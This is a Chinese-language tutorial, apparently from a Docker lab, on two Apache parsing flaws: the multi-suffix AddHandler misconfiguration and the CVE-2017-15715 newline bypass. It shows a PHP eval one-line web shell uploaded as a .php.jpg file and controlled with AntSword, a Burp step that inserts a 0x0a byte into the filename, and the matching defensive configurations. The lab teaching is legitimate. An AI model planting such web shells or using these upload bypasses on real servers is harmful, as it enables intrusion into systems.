## **一、多后缀解析漏洞**

 **形成原因：** 配置apache时，对于apache配置不熟练，配置命令不清楚，在配置PHP文件处理程序时，配置命令存在问题：位于漏洞环境目录的
conf/docker-php.conf里的配置命令（AddHandler application/x-httpd-php
.php），该命令会将后缀中只要含有.php的文件都会被处理程序解析，这导致攻击者可通过多后缀绕过文件上传限制以.php结尾的机制，并使之被处理程序执行。

###  **漏洞复现：**

在漏洞环境目录处运行容器

> [root@localhost apache_parsing_vulnerability]# docker-compose up -d

![1655738297_62b08fb906a7ed9ede6bc.png!small](https://image.3001.net/images/20220620/1655738297_62b08fb906a7ed9ede6bc.png!small)

浏览器访问你的ip地址，可以看到一个文件上传网页![1655738463_62b0905fd4141931e3d38.png!small](https://image.3001.net/images/20220620/1655738463_62b0905fd4141931e3d38.png!small)

  

  

  

  

打开文本编辑器，构造一句话木马

>  
>
>
> <?php  
> eval(@$_POST['axx']);  
> ?>

文件命名为xxx.php.jpg

![1655738881_62b092011240c89ef8ada.png!small](https://image.3001.net/images/20220620/1655738881_62b092011240c89ef8ada.png!small)

  

  

  

  

将该文件上传，出现该页面

![1655739010_62b09282d1fa78099f178.png!small](https://image.3001.net/images/20220620/1655739010_62b09282d1fa78099f178.png!small)

  

  

打开蚁剑，点击添加数据

![1655739102_62b092de7fbe4dcedc563.png!small](https://image.3001.net/images/20220620/1655739102_62b092de7fbe4dcedc563.png!small)

  

  

  

  

  

  

  

  

  

  

  

  

  

按图中提示填写

![1655739374_62b093ee05e124d726cad.png!small](https://image.3001.net/images/20220620/1655739374_62b093ee05e124d726cad.png!small)

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

测试连接，连接成功

![1655739614_62b094de514082556b413.png!small](https://image.3001.net/images/20220620/1655739614_62b094de514082556b413.png!small)

  

  

  

  

  

  

  

  

  

点击添加，可看到我们可以查看该漏洞所在环境的目录中的文件

![1655739701_62b09535d87d129e44525.png!small](https://image.3001.net/images/20220620/1655739701_62b09535d87d129e44525.png!small)

  

  

  

  

  

漏洞复现完成。

###  **两种漏洞防御方法：**

1，拒绝所有文件名含有.php的文件

> <FilesMatch "\\.php\\.">
>
> require all denied
>
> </FilesMatch>

2，处理程序只处理以.php **结尾** 的文件

> 首先将上一个防御方案的配置命令注释掉
>
> 再注释掉原本的处理出现配置命令AddHandler application/x-httpd-php .php
>
> <FilesMatch ".+.php$">
>
> SetHandler application/x-httpd-php
>
> </FilesMatch>

以上就是apache多后缀解析漏洞的知识的

##  **二、换行解析漏洞**

 **形成原因：**

1）查看网页的html代码可知，该文件上传时采用黑名单形式过滤掉php文件

![1655811585_62b1ae0188dea2cfa61ef.png!small](https://image.3001.net/images/20220621/1655811585_62b1ae0188dea2cfa61ef.png!small)

  

  

  

  

  

  

  

2）配置文件中设置正则表达式 对象的 Multiline 属性

  

![1655811703_62b1ae77d4a54690b7136.png!small](https://image.3001.net/images/20220621/1655811703_62b1ae77d4a54690b7136.png!small)

  

  

  

  

$ 还会匹配到字符串结尾的换行符，这导致在上传时，添加一个换行符也能被正常解析，并且能够绕过系统的黑名单检测。

###  **漏洞复现**

在漏洞目录运行容器

> [root@localhost CVE-2017-15715]# docker-compose up -d

![1655811909_62b1af457d8e020f05935.png!small](https://image.3001.net/images/20220621/1655811909_62b1af457d8e020f05935.png!small)

  

  

构造一个简单的php文件

![1655812007_62b1afa7109101c138294.png!small](https://image.3001.net/images/20220621/1655812007_62b1afa7109101c138294.png!small)

  

  

  

  

  

  

  

> <?php  
> phpinfo();  
> ?>

打开bp，抓取上传数据包；

选择16进制，找到文件上传后的名字，默认为evil.php寻找l6进制编码 70 68 70分别对应 php，在第二个70的后方右键，点击 insert
byte... ，然后插入换行符0a
点击确定进行插入。![1655812219_62b1b07b595215a0c5f4d.png!small](https://image.3001.net/images/20220621/1655812219_62b1b07b595215a0c5f4d.png!small)

  

  

放行数据包，访问上传的文件，成功看到phpinfo信息。要加%0A

###  **漏洞防御方法：**

1，升级apache版本

2，对上传的文件进行重命名

3，上传时采用白名单的验证方式

